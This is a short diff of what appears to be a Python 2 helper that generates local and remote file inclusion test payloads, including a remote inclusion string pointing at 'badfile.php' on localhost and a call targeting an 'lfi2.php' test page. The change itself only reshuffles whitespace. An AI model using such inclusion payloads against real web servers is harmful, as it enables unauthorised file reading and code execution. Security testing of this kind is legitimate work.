@@ -26,8 +26,9 @@ def generateLFI(url, depth = 1, filename="index"):
 def generateRFI():
 	return "http://localhost/badfile.php?"
 
-if __name__ == "__main__":
-	
+
+
+if __name__ == "__main__":	
 	url = "/serverside/lfi2.php"
 	generateLFI(url,2, "index")
 	print generateRFI()
